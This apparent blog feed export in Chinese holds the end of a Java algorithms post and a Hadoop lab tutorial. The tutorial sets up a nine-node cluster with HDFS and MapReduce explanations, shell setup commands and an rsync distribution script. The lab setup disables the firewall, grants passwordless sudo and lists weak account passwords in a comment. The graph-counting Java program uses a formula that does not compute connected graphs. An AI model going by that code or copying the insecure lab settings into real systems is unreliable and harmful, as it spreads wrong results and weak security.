<span class="number">9</span>; i++) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;3&quot;</span> + i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="string">&quot;4.mp4&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 10</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;4&quot;</span> + i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                System.out.println(<span class="number">5</span> + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                System.out.println(<span class="number">50</span> + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n - <span class="number">50</span>; i++) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;5&quot;</span> + i + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                    left--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line">                <span class="keyword">while</span> (left &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(j + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                    j++;</span><br><span class="line">                    left--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> left)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (left == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> l + i;</span><br><span class="line">            <span class="keyword">if</span> (temp &lt;= r) &#123;</span><br><span class="line">                System.out.println(temp + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                left--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                func(l / <span class="number">10</span>, l - <span class="number">1</span>, left);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (left == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> t;</span><br><span class="line">            <span class="keyword">if</span> (left &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println((l / <span class="number">10</span> + i) + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                left--;</span><br><span class="line">                t = (l / <span class="number">10</span> + i) * <span class="number">10</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> l % <span class="number">10</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (left == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> t + j;</span><br><span class="line">                <span class="keyword">if</span> (temp &lt;= r) &#123;</span><br><span class="line">                    System.out.println(temp + <span class="string">&quot;.mp4&quot;</span>);</span><br><span class="line">                    left--;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    func(temp / <span class="number">10</span>, l - <span class="number">1</span>, left);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="n个节点m条边的无向联通图的个数"><a href="#n个节点m条边的无向联通图的个数" class="headerlink" title="n个节点m条边的无向联通图的个数"></a>n个节点m条边的无向联通图的个数</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNext()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> m - n + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> ((n * (n - <span class="number">1</span>)) / left)  -  (n - <span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> (i * (i - <span class="number">1</span>)) / left;</span><br><span class="line">            System.out.println(result % (<span class="number">1000000007</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-4 多物理机环境搭建</title>
    <url>/2021/12/22/Lab-4%20%E5%A4%9A%E7%89%A9%E7%90%86%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="Lab-4-多物理机环境搭建和词频统计-九个节点，三台物理机"><a href="#Lab-4-多物理机环境搭建和词频统计-九个节点，三台物理机" class="headerlink" title="Lab-4 多物理机环境搭建和词频统计(九个节点，三台物理机)"></a>Lab-4 多物理机环境搭建和词频统计(九个节点，三台物理机)</h1><h2 id="一、实验原理分析"><a href="#一、实验原理分析" class="headerlink" title="一、实验原理分析"></a>一、实验原理分析</h2><h3 id="Hadoop是什么"><a href="#Hadoop是什么" class="headerlink" title="Hadoop是什么"></a>Hadoop是什么</h3><p>Hadoop是Apache软件基金会所开发的并行计算框架与分布式文件系统。最核心的模块包括Hadoop Common、HDFS与MapReduce。</p>
<h3 id="HDFS架构"><a href="#HDFS架构" class="headerlink" title="HDFS架构"></a>HDFS架构</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115381.png" alt="image-20210628203053925"></p>
<h3 id="HDFS文件写入"><a href="#HDFS文件写入" class="headerlink" title="HDFS文件写入"></a>HDFS文件写入</h3><p>Client向NameNode发起文件写入的请求。</p>
<ol>
<li>NameNode根据文件大小和文件块配置情况，返回给Client它所管理部分DataNode的信息。</li>
<li>Client将文件划分为多个block块，并根据DataNode的地址信息，按顺序写入到每一个DataNode块中。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220112888.png" alt="58qho28cfd"></p>
<p>例如：有一个文件FileA，100M大小。Client将FileA写入到HDFS上。</p>
<ol>
<li>HDFS按默认配置。</li>
<li>HDFS分布在三个机架上Rack1，Rack2，Rack3。</li>
</ol>
<p>文件写入过程如下：</p>
<ol>
<li>Client将FileA按64M分块。分成两块，block1和Block2;</li>
<li>Client向NameNode发送写数据请求，如图蓝色虚线①——&gt;。</li>
<li>NameNode节点，记录block信息。并返回可用的DataNode，如粉色虚线②———&gt;。<ol>
<li>Block1: host2,host1,host3</li>
<li>Block2: host7,host8,host4</li>
<li>原理：<ol>
<li>NameNode具有RackAware机架感知功能，这个可以配置。</li>
<li>若Client为DataNode节点，那存储block时，规则为：副本1，同Client的节点上；副本2，不同机架节点上；副本3，同第二个副本机架的另一个节点上；其他副本随机挑选。</li>
<li>若Client不为DataNode节点，那存储block时，规则为：副本1，随机选择一个节点上；副本2，不同副本1，机架上；副本3，同副本2相同的另一个节点上；其他副本随机挑选。</li>
</ol>
</li>
</ol>
</li>
<li>Client向DataNode发送block1；发送过程是以流式写入。流式写入过程如下：<ol>
<li>将64M的block1按64k的package划分;</li>
<li>然后将第一个package发送给host2;</li>
<li>host2接收完后，将第一个package发送给host1，同时Client向host2发送第二个package；</li>
<li>host1接收完第一个package后，发送给host3，同时接收host2发来的第二个package。</li>
<li>以此类推，如图红线实线所示，直到将block1发送完毕。</li>
<li>host2,host1,host3向NameNode，host2向Client发送通知，说“消息发送完了”。如图粉红颜色实线所示。</li>
<li>Client收到host2发来的消息后，向NameNode发送消息，说我写完了。这样就真完成了。如图黄色粗实线</li>
<li>发送完block1后，再向host7、host8、host4发送block2，如图蓝色实线所示。</li>
<li>发送完block2后，host7、host8、host4向NameNode，host7向Client发送通知，如图浅绿色实线所示。</li>
<li>Client向NameNode发送消息，说我写完了，如图黄色粗实线。。。这样就完毕了。</li>
</ol>
</li>
<li>分析：通过写过程，我们可以了解到<ol>
<li>写1T文件，我们需要3T的存储，3T的网络流量带宽。</li>
<li>在执行读或写的过程中，NameNode和DataNode通过HeartBeat进行保存通信，确定DataNode活着。如果发现DataNode死掉了，就将死掉的DataNode上的数据，放到其他节点去。读取时，要读其他节点去。</li>
<li>挂掉一个节点，没关系，还有其他节点可以备份；甚至，挂掉某一个机架，也没关系；其他机架上，也有备份。</li>
</ol>
</li>
</ol>
<h3 id="HDFS文件读取"><a href="#HDFS文件读取" class="headerlink" title="HDFS文件读取"></a>HDFS文件读取</h3><p>当文件读取：</p>
<ol>
<li>Client向NameNode发起文件读取的请求。</li>
<li>NameNode返回文件存储的block块信息、及其block块所在DataNode的信息。</li>
<li>Client读取文件信息。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115382.png" alt="ttt078ctfp"></p>
<p>如图所示，Client要从DataNode上，读取FileA。而FileA由block1和block2组成。读操作流程如下：</p>
<ol>
<li>Client向NameNode发送读请求。</li>
<li>NameNode查看Metadata信息，返回FileA的block的位置。<ol>
<li>block1:host2,host1,host3</li>
<li>block2:host7,host8,host4</li>
</ol>
</li>
<li>block的位置是有先后顺序的，先读block1，再读block2。而且block1去host2上读取；然后block2，去host7上读取。</li>
</ol>
<p>上面例子中，Client位于机架外，那么如果Client位于机架内某个DataNode上，例如,Client是host6。那么读取的时候，遵循的规律是：<strong>优选读取本机架上的数据。</strong></p>
<h3 id="MapReduce核心思想"><a href="#MapReduce核心思想" class="headerlink" title="MapReduce核心思想"></a>MapReduce核心思想</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115383.png" alt="image-20210701084254232"></p>
<ul>
<li><p>分布式的运算程序往往需要分成至少 2 个阶段。</p>
</li>
<li><p>第一个阶段的 MapTask 并发实例，完全并行运行，互不相干。</p>
</li>
<li><p>第二个阶段的 ReduceTask 并发实例互不相干，但是他们的数据依赖于上一个阶段</p>
</li>
</ul>
<p>的所有 MapTask 并发实例的输出。</p>
<ul>
<li>MapReduce 编程模型只能包含一个 Map 阶段和一个 Reduce 阶段，如果用户的业</li>
</ul>
<p>务逻辑非常复杂，那就只能多个 MapReduce 程序，串行运行。</p>
<h2 id="二、实验代码及命令分析"><a href="#二、实验代码及命令分析" class="headerlink" title="二、实验代码及命令分析"></a>二、实验代码及命令分析</h2><h3 id="准备三台主机MacBook-pro，Windows-10-1，Windows-10-2"><a href="#准备三台主机MacBook-pro，Windows-10-1，Windows-10-2" class="headerlink" title="准备三台主机MacBook pro，Windows 10-1，Windows 10-2"></a>准备三台主机MacBook pro，Windows 10-1，Windows 10-2</h3><p>在mbp上用Parallels Desktop安装centos 7.5，主机名为hadoop102</p>
<p>在win10-1用VMware Workstation安装centos 7.5，主机名为hadoop103</p>
<p>在win10-2用VMware Workstation安装centos 7.5，主机名为hadoop104</p>
<p>下面为mac上的hadoop102的为例，win也用同样方法配置一台模板机：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改主机名</span></span><br><span class="line">[hmw@hadoop102 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙</span></span><br><span class="line">[hmw@hadoop102 ~]$ systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">[hmw@hadoop102 ~]$ systemctl disable firewalld.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建huang用户</span></span><br><span class="line">[hmw@hadoop102 ~]$ useradd huang</span><br><span class="line">[hmw@hadoop102 ~]$ passwd huang</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">root和hmw密码hmw，huang密码yc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置hmw用户具有root权限</span></span><br><span class="line">[hmw@hadoop102 ~]$ vi /etc/sudoers</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在%wheel  ALL=(ALL) ALL这行下面添加一行</span> </span><br><span class="line">huang ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这一行不要直接放到 root 行下面，因为所有用户都属于 wheel 组，你先配置了huang具有免密功能，但是程序执行到%wheel行时，该功能又被覆盖回需要密码。所以huang要放到%wheel这行下面。</span></span><br><span class="line"></span><br><span class="line">[hmw@hadoop102 ~]$ mkdir /opt/module</span><br><span class="line">[hmw@hadoop102 ~]$ mkdir /opt/software</span><br><span class="line">[hmw@hadoop102 ~]$ chown huang:huang /opt/module</span><br><span class="line">[hmw@hadoop102 ~]$ chown huang:huang /opt/software</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看这两个文件的所有者和所有属组</span></span><br><span class="line">[hmw@hadoop102 ~]$ cd /opt</span><br><span class="line">[hmw@hadoop102 ~]$ ll</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">卸载虚拟机自带的JDK</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rpm-qa:查询所安装的所有rpm软件包</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">grep -i:忽略大小写</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">xargs -n1:表示每次只传递一个参数</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rpm -e –nodeps:强制卸载软件</span></span><br><span class="line">[hmw@hadoop102 ~]$ rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启</span></span><br><span class="line">[hmw@hadoop102 ~]$ reboot</span><br></pre></td></tr></table></figure>

<h3 id="克隆虚拟机"><a href="#克隆虚拟机" class="headerlink" title="克隆虚拟机"></a>克隆虚拟机</h3><p>在mbp上利用模版虚拟机克隆三台虚拟机hadoop102（192.168.58.31） hadoop109(192.168.58.107) hadoop110(192.168.58.155) ，克隆的时候先关闭虚拟机</p>
<p>在win10-1上利用模版虚拟机克隆三台虚拟机hadoop103（192.168.58.68） hadoop107(192.168.58.43) hadoop108(192.168.58.121) ，克隆的时候先关闭虚拟机</p>
<p>在win10-2上利用模版虚拟机克隆三台虚拟机hadoop104（192.168.58.190） hadoop105(192.168.58.189) hadoop106(192.168.58.34) ，克隆的时候先关闭虚拟机</p>
<h4 id="修改克隆机的主机名和hosts，已hadoop102为例"><a href="#修改克隆机的主机名和hosts，已hadoop102为例" class="headerlink" title="修改克隆机的主机名和hosts，已hadoop102为例"></a>修改克隆机的主机名和hosts，已hadoop102为例</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改hostname</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改hosts</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /etc/hosts</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mbp</span></span><br><span class="line">192.168.58.31 hadoop102</span><br><span class="line">192.168.58.107 hadoop109</span><br><span class="line">192.168.58.155 hadoop110</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win10-1</span></span><br><span class="line">192.168.58.68 hadoop103</span><br><span class="line">192.168.58.43 hadoop107</span><br><span class="line">192.168.58.121 hadoop108</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win10-2</span></span><br><span class="line">192.168.58.190 hadoop104</span><br><span class="line">192.168.58.189 hadoop105</span><br><span class="line">192.168.58.34 hadoop106</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启</span></span><br><span class="line">[huang@hadoop102 ~]$ reboot</span><br></pre></td></tr></table></figure>

<p>其他虚拟机以相同方式去修改</p>
<h4 id="修改主机Mac的hosts"><a href="#修改主机Mac的hosts" class="headerlink" title="修改主机Mac的hosts"></a>修改主机Mac的hosts</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % vi /etc/hosts</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mbp</span></span><br><span class="line">192.168.58.31 hadoop102</span><br><span class="line">192.168.58.107 hadoop109</span><br><span class="line">192.168.58.155 hadoop110</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win10-1</span></span><br><span class="line">192.168.58.68 hadoop103</span><br><span class="line">192.168.58.43 hadoop107</span><br><span class="line">192.168.58.121 hadoop108</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">win10-2</span></span><br><span class="line">192.168.58.190 hadoop104</span><br><span class="line">192.168.58.189 hadoop105</span><br><span class="line">192.168.58.34 hadoop106</span><br></pre></td></tr></table></figure>

<h3 id="在hadoop102安装JDK"><a href="#在hadoop102安装JDK" class="headerlink" title="在hadoop102安装JDK"></a>在hadoop102安装JDK</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将mac中下载好的jdk导入到hadoop102虚拟机的/opt/software目录下</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/jdk-8u212-linux-x64.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看是否导入成功</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压</span></span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置JDK环境变量</span></span><br><span class="line">[huang@hadoop102 ~]$  sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让新的环境变量生效</span></span><br><span class="line">[huang@hadoop102 ~]$ source /etc/profile</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看是否安装成功</span></span><br><span class="line">[huang@hadoop102 ~]$ java -version</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="在hadoop102安装Hadoop"><a href="#在hadoop102安装Hadoop" class="headerlink" title="在hadoop102安装Hadoop"></a>在hadoop102安装Hadoop</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将mac中下载好的hadoop导入到hadoop102虚拟机的/opt/software目录下</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/hadoop-3.1.3.tar.gz huang@hadoop102:/opt/software/</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ tar -zxvf hadoop-3.1.3.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置环境变量</span></span><br><span class="line">[huang@hadoop102 software]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ pwd</span><br><span class="line">/opt/module/hadoop-3.1.3</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sudo vi /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">HADOOP_HOME</span></span><br><span class="line">export HADOOP_HOME=/opt/module/hadoop-3.1.3 export PATH=$PATH:$HADOOP_HOME/bin</span><br><span class="line">export PATH=$PATH:$HADOOP_HOME/sbin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让配置文件生效</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ source /etc/profile</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看是否安装成功</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop version</span><br></pre></td></tr></table></figure>

<h3 id="Hadoop目录结构"><a href="#Hadoop目录结构" class="headerlink" title="Hadoop目录结构"></a>Hadoop目录结构</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 200</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br></pre></td></tr></table></figure>

<ul>
<li>bin 目录:存放对 Hadoop 相关服务(hdfs，yarn，mapred)进行操作的脚本 </li>
<li>etc 目录:Hadoop 的配置文件目录，存放 Hadoop 的配置文件</li>
<li>lib 目录:存放 Hadoop 的本地库(对数据进行压缩解压缩功能)</li>
<li>sbin 目录:存放启动或停止 Hadoop 相关服务的脚本</li>
<li>share 目录:存放 Hadoop 的依赖 jar 包、文档、和官方案例</li>
</ul>
<h3 id="编写集群分发脚本"><a href="#编写集群分发脚本" class="headerlink" title="编写集群分发脚本"></a>编写集群分发脚本</h3><h4 id="rsync和scp的区别"><a href="#rsync和scp的区别" class="headerlink" title="rsync和scp的区别"></a>rsync和scp的区别</h4><p>rsync 主要用于备份和镜像。具有速度快、避免复制相同内容和支持符号链接的优点。</p>
<p>rsync 和 scp 区别:用 rsync 做文件的复制要比 scp 的速度快，rsync 只对差异文件做更</p>
<p>新。scp 是把所有文件都复制过去。</p>
<h4 id="编写xsync集群分发脚本"><a href="#编写xsync集群分发脚本" class="headerlink" title="编写xsync集群分发脚本"></a>编写xsync集群分发脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/</span><br><span class="line">[huang@hadoop102 ~]$ mkdir bin</span><br><span class="line">[huang@hadoop102 ~]$ cd bin</span><br><span class="line">[huang@hadoop102 bin]$ vi xsync</span><br></pre></td></tr></table></figure>

<p>添加一下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1. 判断参数个数</span> </span><br><span class="line">if [ $# -lt 1 ] </span><br><span class="line">then</span><br><span class="line">		echo Not Enough Arguement!</span><br><span class="line">		exit; </span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2. 遍历集群所有机器</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 hadoop105 hadoop106 hadoop107 hadoop108 hadoop109 hadoop110</span><br><span class="line">do</span><br><span class="line">	echo ==================== $host ==================== </span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">3. 遍历所有目录，挨个发送</span></span><br><span class="line">  for file in $@</span><br><span class="line">  do</span><br><span class="line"><span class="meta prompt_">		#</span><span class="language-bash">4. 判断文件是否存在</span> </span><br><span class="line">		if [ -e $file ]</span><br><span class="line">		then</span><br><span class="line">				#5. 获取父目录</span><br><span class="line">				pdir=$(cd -P $(dirname $file); pwd)</span><br><span class="line">				#6. 获取当前文件的名称 </span><br><span class="line">				fname=$(basename $file)</span><br><span class="line">				ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">				rsync -av $pdir/$fname $host:$pdir</span><br><span class="line">    else</span><br><span class="line">        echo $file does not exists!</span><br><span class="line">		fi </span><br><span class="line">	done</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="分发环境变量"><a href="#分发环境变量" class="headerlink" title="分发环境变量"></a>分发环境变量</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改脚本xsync具有执行权限</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x xsync </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将脚本复制到/bin，以便全局调用</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp xsync /bin/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果用了sudo，那么xsync一定要给它的路径补全</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">同步环境变量配置（root所有者）</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo ./bin/xsync /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">让环境变量生效(在有机器上都需要执行下面的操作，下面也hadoop103为例)</span></span><br><span class="line">[huang@hadoop102 ~]$ ssh hadoop103</span><br><span class="line">[huang@hadoop103 ~]$ source /etc/profile</span><br></pre></td></tr></table></figure>

<h3 id="SSH无密码登陆配置"><a href="#SSH无密码登陆配置" class="headerlink" title="SSH无密码登陆配置"></a>SSH无密码登陆配置</h3><h4 id="免密码登陆原理"><a href="#免密码登陆原理" class="headerlink" title="免密码登陆原理"></a>免密码登陆原理</h4><p><strong>1.通常的ssh密码登陆过程</strong></p>
<ul>
<li>用户向所要登陆的远程主机发送登陆请求</li>
<li>远程主机收到用户的登录请求，把自己的公钥发送给用户</li>
<li>用户使用这个公钥，将登陆密码加密后，发送给远程主机</li>
<li>远程主机用自己的私钥，解密登陆密码，如果密码正确，就同意用户登陆</li>
</ul>
<p>在linux中，如果第一次通过ssh登陆远程主机，会出现以下提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ ssh huang@hadoop103</span><br><span class="line">The authenticity of host &#x27;hadoop103 (192.168.58.68)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:wsBGThjnNNKRLdb8nms49AJFfnTt6erg5jHj4bCXm40.</span><br><span class="line">ECDSA key fingerprint is MD5:93:ee:77:88:bc:7a:ed:0a:3d:d6:62:ce:95:38:be:05.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br></pre></td></tr></table></figure>

